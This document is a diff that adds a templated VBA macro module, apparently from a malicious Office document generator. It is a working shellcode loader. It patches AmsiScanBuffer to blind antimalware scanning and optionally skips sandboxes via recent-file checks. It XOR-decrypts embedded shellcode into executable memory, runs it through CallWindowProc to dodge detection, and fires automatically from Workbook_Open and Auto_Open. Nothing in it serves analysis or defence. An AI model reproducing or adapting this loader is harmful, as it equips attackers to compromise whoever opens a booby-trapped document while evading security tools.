@@ -1,0 +1,91 @@
+Attribute VB_Name = "{{ v.module_name }}"
+Option Explicit
+
+#If VBA7 Then
+    Private Declare PtrSafe Function {{ v.fn_valloc }} Lib "kernel32" Alias "VirtualAlloc" _
+        (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, _
+         ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" _
+        (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
+    Private Declare PtrSafe Function {{ v.fn_callwp }} Lib "user32" Alias "CallWindowProcA" _
+        (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
+         ByVal Msg As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
+    Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal name As String) As LongPtr
+    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" _
+        (ByVal hModule As LongPtr, ByVal name As String) As LongPtr
+    Private Declare PtrSafe Function VirtualProtect Lib "kernel32" _
+        (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
+         ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
+#End If
+
+Private Sub {{ v.fn_amsi_patch }}()
+    On Error Resume Next
+    Dim amsiBase As LongPtr, scanAddr As LongPtr
+    amsiBase = LoadLibraryA("amsi.dll")
+    If amsiBase = 0 Then Exit Sub
+    scanAddr = GetProcAddress(amsiBase, "AmsiScanBuffer")
+    If scanAddr = 0 Then Exit Sub
+    Dim oldP As Long
+    VirtualProtect scanAddr, 6, &H40, oldP
+    ' Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
+    Dim patch(0 To 5) As Byte
+    patch(0) = &HB8: patch(1) = &H57: patch(2) = &H0: patch(3) = &H7: patch(4) = &H80: patch(5) = &HC3
+    RtlMoveMemory scanAddr, patch(0), 6
+End Sub
+
+Private Function {{ v.fn_hex2arr }}(hex As String) As Byte()
+    Dim n As Long: n = Len(hex) \ 2
+    Dim arr() As Byte: ReDim arr(0 To n - 1)
+    Dim i As Long
+    For i = 0 To n - 1
+        arr(i) = CByte("&H" & Mid$(hex, i * 2 + 1, 2))
+    Next
+    {{ v.fn_hex2arr }} = arr
+End Function
+
+Private Function {{ v.fn_xor }}(data() As Byte, key() As Byte) As Byte()
+    Dim n As Long: n = UBound(data)
+    Dim k As Long: k = UBound(key) + 1
+    Dim out() As Byte: ReDim out(0 To n)
+    Dim i As Long
+    For i = 0 To n
+        out(i) = data(i) Xor key(i Mod k)
+    Next
+    {{ v.fn_xor }} = out
+End Function
+
+Private Sub {{ v.fn_exec }}()
+    {% if "SandboxUser" in feature_names %}
+    ' Sandbox checks
+    If Application.Workbooks.Count < 1 Then Exit Sub
+    If Application.RecentFiles.Count < 3 Then Exit Sub
+    {% endif %}
+
+    Call {{ v.fn_amsi_patch }}
+
+    Dim sc_hex As String, key_hex As String
+    sc_hex  = "{{ shellcode_hex }}"
+    key_hex = "{{ key_hex }}"
+
+    Dim raw() As Byte, key() As Byte, sc() As Byte
+    raw = {{ v.fn_hex2arr }}(sc_hex)
+    key = {{ v.fn_hex2arr }}(key_hex)
+    sc  = {{ v.fn_xor }}(raw, key)
+
+    Dim mem As LongPtr
+    mem = {{ v.fn_valloc }}(0, UBound(sc) + 1, &H3000, &H40)
+    RtlMoveMemory mem, sc(0), UBound(sc) + 1
+
+    ' Execute via CallWindowProc — no CreateThread (cleaner heuristic)
+    {{ v.fn_callwp }} mem, 0, 0, 0, 0
+End Sub
+
+' Auto-trigger when workbook opens (place in ThisWorkbook module)
+Public Sub Workbook_Open()
+    Call {{ v.fn_exec }}
+End Sub
+
+' Alternate trigger: Auto_Open (older Office compatibility)
+Public Sub Auto_Open()
+    Call {{ v.fn_exec }}
+End Sub
